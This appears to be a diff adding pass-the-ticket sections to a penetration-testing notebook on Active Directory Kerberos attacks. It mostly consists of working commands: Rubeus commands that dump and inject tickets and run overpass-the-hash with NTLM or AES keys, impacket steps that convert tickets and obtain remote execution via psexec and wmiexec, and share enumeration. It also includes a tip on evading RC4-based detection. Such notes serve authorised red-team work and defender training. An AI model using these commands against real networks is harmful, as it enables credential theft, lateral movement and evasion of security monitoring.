@@ -70,3 +70,57 @@ PS C:\> ls \\TARGET_HOSTNAME\SHARE\
 PS C:\> cat \\TARGET_HOSTNAME\SHARE\file
 ...
 ```
+
+---
+
+# PtT with Rubeus (modern alternative to Mimikatz)
+
+Rubeus is usually preferred on modern, EDR-heavy targets. It can dump, request and inject tickets in one tool.
+```powershell
+# Dump all tickets currently cached in memory (needs admin for other users' tickets)
+PS C:\> .\Rubeus.exe dump /nowrap
+
+# Inject a base64 .kirbi ticket into the CURRENT logon session (no admin needed for /ptt)
+PS C:\> .\Rubeus.exe ptt /ticket:<BASE64_KIRBI>
+PS C:\> .\Rubeus.exe ptt /ticket:ticket.kirbi
+
+# Ask for a fresh TGT from a hash/AES key and inject it (overpass-the-hash / pass-the-key)
+PS C:\> .\Rubeus.exe asktgt /user:USER /rc4:<NTLM_HASH> /ptt
+PS C:\> .\Rubeus.exe asktgt /user:USER /aes256:<AES256_KEY> /ptt   # AES avoids RC4 downgrade detections
+
+# Confirm the ticket is loaded
+PS C:\> klist
+```
+
+> [!Tip]
+> Prefer `/aes256` over `/rc4` when you have the AES key — RC4 (etype 23) Kerberos requests are a common detection signature for pass-the-key attacks.
+
+# PtT from Linux (impacket / ccache)
+
+On Linux the ticket lives in a **ccache** file and is selected via the `KRB5CCNAME` environment variable.
+```bash
+# Convert a Windows .kirbi to a Linux ccache (impacket)
+$ impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Point the environment at the ccache and use -k / -no-pass with any impacket tool
+$ export KRB5CCNAME=$(pwd)/ticket.ccache
+$ klist                                   # verify (from krb5-user)
+$ impacket-psexec -k -no-pass TARGET_FQDN
+$ impacket-wmiexec -k -no-pass TARGET_FQDN
+$ crackmapexec smb TARGET_FQDN -k --shares
+```
+
+> [!Warning]
+> Kerberos is time-sensitive. If tools fail with `KRB_AP_ERR_SKEW`, sync your clock to the DC first — see [[Clock Skew]]. Always reference hosts by **FQDN**, never by IP, or Kerberos falls back to NTLM and the ticket is ignored.
+
+---
+
+# Related notes
+- [[Pass the Hash (PtH)]] — when you have the NTLM hash instead of a ticket
+- [[Kerberoasting]] — request and crack service (TGS) tickets
+- [[AS-REP Roasting]] — obtain crackable tickets for users without pre-auth
+- [[Silver Ticket]] — forge a TGS for a specific service
+- [[Kerberos on Linux]] — deeper ccache/keytab workflow on Linux
+- [[Clock Skew]] — fix `KRB_AP_ERR_SKEW` before any Kerberos attack
+- [[Enter-PSSession]] — remoting into hosts once a ticket is loaded
+- [[AD Enumeration with PowerView]] — finding admin access and the DC FQDN
